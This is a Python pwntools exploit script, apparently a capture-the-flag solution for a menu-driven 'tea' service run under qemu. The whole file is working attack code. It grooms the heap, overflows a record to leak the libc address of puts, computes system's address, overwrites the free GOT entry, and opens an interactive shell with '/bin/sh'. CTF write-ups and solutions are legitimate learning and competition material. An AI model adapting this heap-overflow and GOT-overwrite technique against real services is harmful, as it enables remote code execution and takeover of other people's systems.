from pwn import *
import re

s = remote('127.0.0.1', 12345)
#s = remote('hitme.tasteless.eu', 10301)
#s = process('./run.sh')

context.log_level = 'debug'

def add_tea(name, desc, t):
    s.send('A')
    s.recvuntil('Name: ')
    s.send(name)
    s.recvuntil('length: ')
    s.send('%d' % len(desc))
    s.recvuntil('Description:')
    s.send(desc)
    s.recvuntil('time:')
    s.send('%d' % t)
    clr()

def list_tea():
    s.send('l')
    data = s.recvuntil('> ')
    return data

def mod_tea(tid, new_name=None, new_desc=None, new_time=None, do_clr=True):
    s.send('m')
    s.recvuntil('id:')
    s.send('%d'% tid)
    s.recvuntil('[y/n] ')
    if new_name is not None:
        s.send('y')
        s.recvuntil('name: ')
        s.send(new_name)
    else:
        s.send('n')
    s.recvuntil('[y/n] ')

    if new_desc is not None:
        s.send('y')
        s.recvuntil('length:' )
        s.send('%d'% len(new_desc))
        s.recvuntil('description: ')
        s.send(new_desc)
    else:
        s.send('n')

    s.recvuntil('[y/n] ')
    if new_time is not None:
        s.send('y')
        s.recvuntil('time: ')
        s.send('%d' % new_time)
    else:
        s.send('n')

    if do_clr is True:
        clr()


def rm_tea(tid):
    s.send('R')
    s.recvuntil('id: ')
    s.send('%d' % tid)
    clr()


def clr():
    s.recvuntil('> ')
    import time; time.sleep(.5)

PUTS_PLT = 0x413088
FREE_PLT = 0x413090
SYSTEM_OFF = 0x3E480



def main():
    print("Connecting to qemu, this may take a while")
    s.recvuntil('tasteless')
    clr()


    pl = fit({0:0xdeadbeef,
              0x40: p64(0),
              0x48: p64(0x31),
              0x50: p64(1337),  # id
              0x58: p64(FREE_PLT),   #id_name
              0x60: p64(PUTS_PLT), # disp_name
              0x68: p64(8),   #desc_len
              0x70: p64(0),   #next
              0x78: p64(0x31),
              #0x70: p64(puts_LIBC)


             }, length=128)

    print("[+] Add  Tea 1 (overflow basic)")
    add_tea('A'*8, pl, 1)

    print("[+] Add  Tea 2 (feng shui)")
    add_tea('B'*8, '\x02'*64, 1)

    print("[+] Add  Tea 3 (victim)")
    add_tea('C'*8, '\x03'*64, 1)

    print("[+] Del  Tea 2 (feng shui)")
    rm_tea(1)

    print("[+] Prepare OFLOW")
    mod_tea(0, new_name='1111', new_desc='2'*63, new_time=1000)

    print("[+] Trigger OFLOW and LEAK")
    data_with_leak = list_tea()

    puts_leaked_raw = re.findall(b'name: (.*)\n', data_with_leak)[1]

    puts_leaked = u64(puts_leaked_raw.ljust(8, b'\0'))
    print("[+] Leaked puts addres 0x%x" % puts_leaked)

    target_address = puts_leaked - 0x62A88 + SYSTEM_OFF

    pl = b'/bin/sh\0'
    pl += p64(target_address)
    mod_tea(1337, new_name=pl, do_clr=False)


    s.interactive()



if __name__ == '__main__':
    main()


